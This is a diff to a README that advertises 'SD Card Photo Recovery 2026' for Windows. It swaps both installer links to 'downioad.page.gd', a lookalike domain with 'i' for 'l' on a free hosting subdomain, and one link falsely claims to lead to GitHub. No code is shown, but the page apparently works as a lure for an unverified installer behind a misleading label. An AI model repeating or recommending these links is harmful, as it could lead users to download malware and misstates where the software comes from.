@@ -2,7 +2,7 @@
 
 SD Card Photo Recovery 2026 is a comprehensive software solution designed to help you recover lost or deleted photos from SD cards on Windows 10 and 11. Whether your SD card has been formatted, corrupted, or files were accidentally removed, this tool provides a reliable and efficient way to restore your valuable memories.
 
-[![Download Installer](https://img.shields.io/badge/Download-SetupLatest-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-SetupLatest-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -80,7 +80,7 @@ SD Card Photo Recovery 2026 is provided "as-is" for data recovery purposes. Whil
 
 For the latest version of SD Card Photo Recovery 2026, including updates and new features, please visit our download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
